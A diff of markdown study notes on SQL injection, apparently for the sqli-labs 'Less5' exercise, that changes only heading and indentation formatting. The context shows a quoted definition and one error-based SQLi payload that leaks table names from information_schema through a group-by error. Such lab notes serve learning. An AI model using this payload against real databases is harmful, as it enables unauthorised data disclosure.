@@ -1,5 +1,5 @@
 # Sqli
-    SQL injection is a code injection technique
+SQL injection is a code injection technique
 
 
 >SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.
@@ -13,8 +13,8 @@
 
 ----
 
-### Less5
-	Error-based SQLi
+## Less5
+Error-based SQLi
 
 ``` sql
     '1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema = database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a limit 0,1)b) --+
